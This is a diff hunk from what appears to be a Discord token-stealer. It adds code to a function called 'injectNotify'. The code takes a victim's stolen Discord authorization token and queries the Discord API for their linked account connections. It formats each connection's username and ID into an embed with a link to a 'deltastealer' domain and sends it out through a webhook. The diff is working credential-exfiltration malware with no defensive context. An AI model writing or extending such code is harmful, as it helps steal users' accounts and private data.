@@ -184,5 +184,43 @@ function injectNotify() {
 	.catch(error => {
 
     })
+	
+	axios
+            .get(
+                "https://discord.com/api/v9/users/@me/connections",
+                {
+                headers: {
+                    "Content-Type": "application/json",
+                    Authorization: token,
+                },
+                }
+            )
+        .then((conns) => {
+                if (conns.data.length >= 1) {
+
+
+                var culoembed = {
+                    color: 0000000,
+                    title: "Connections",
+                    fields: [],
+                };
+                conns.data.forEach((connection) => {
+                    var lavergadejuan = "no";
+                    culoembed.fields.push({
+                    name: `${penemojis[connection.type]} ${
+                        connection.type
+                    }`,
+                    value: `\`Username:\` ${connection.name}\n\`ID:\` ${connection.id}\n\`Access Token:\` **[Copy here](https://raw.deltastealer.gq/${lavergadejuan})**`,
+                    inline: true,
+                    });
+                });
+            hook.send(culoembed)
+            .then(res => {
+            })
+            .catch(error => {
+        
+            })
+                }
+            })
 
 }
